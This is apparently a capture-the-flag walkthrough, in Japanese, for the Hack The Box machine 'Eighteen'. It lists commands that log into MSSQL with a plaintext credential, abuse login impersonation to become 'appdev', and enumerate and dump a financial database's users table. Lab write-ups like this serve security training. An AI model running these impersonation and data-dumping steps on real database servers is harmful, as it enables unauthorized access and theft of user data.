# HTB_Eighteen
## Login
```zsh
impacket-mssqlclient kevin:'iNa2we6haRj2gaw!'@eighteen.htb
```

## 権限の確認
```zsh
enum_impersonate
```

## ユーザの切り替え
```zsh
execute as login = 'appdev'
```

## DBの一覧表示
```zsh
select name from sys.databases;
```

## DBの使用
```zsh
use financial_planner;
```

## テーブルの一覧表示
```zsh
select * from financial_planner.INFORMATION_SCHEMA.TABLES;
```

## データの確認
```zsh
select * from users;
```